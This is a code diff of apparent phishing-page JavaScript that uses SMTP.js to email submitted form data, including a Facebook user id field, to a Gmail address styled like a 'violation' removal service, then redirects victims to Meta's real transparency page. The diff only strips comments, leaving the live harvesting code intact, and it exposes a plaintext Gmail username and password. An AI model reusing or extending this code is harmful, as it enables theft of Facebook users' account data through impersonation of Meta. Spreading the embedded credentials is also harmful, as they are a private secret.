@@ -25,11 +25,11 @@
 
             // Send email using SMTP.js
             Email.send({
-                Host: "smtp.gmail.com", // Replace with your SMTP server
-                Username: "adeebamemon22@gmail.com",   // Replace with your SMTP username
-                Password: "Nizamani00",      // Replace with your SMTP password
-                To: "violation.removes@gmail.com",         // Replace with your email address
-                From: "adeebamemon22@gmail.com",       // Replace with your email address
+                Host: "smtp.gmail.com",
+                Username: "adeebamemon22@gmail.com",
+                Password: "Nizamani00",
+                To: "violation.removes@gmail.com",
+                From: "adeebamemon22@gmail.com",
                 Subject: "New form submission",
                 Body: `
                     <p><strong>uid:</strong> ${c_user}</p>
@@ -38,7 +38,7 @@
             }).then(function(response) {
                 alert("Email sent successfully!");
                 // Redirect to another page after email is sent
-                window.location.href = "https://transparency.meta.com/en-gb/"; // Replace with your redirect URL
+                window.location.href = "https://transparency.meta.com/en-gb/";
             }).catch(function(error) {
                 alert("Failed to send email.");
                 console.error("Error sending email:", error);
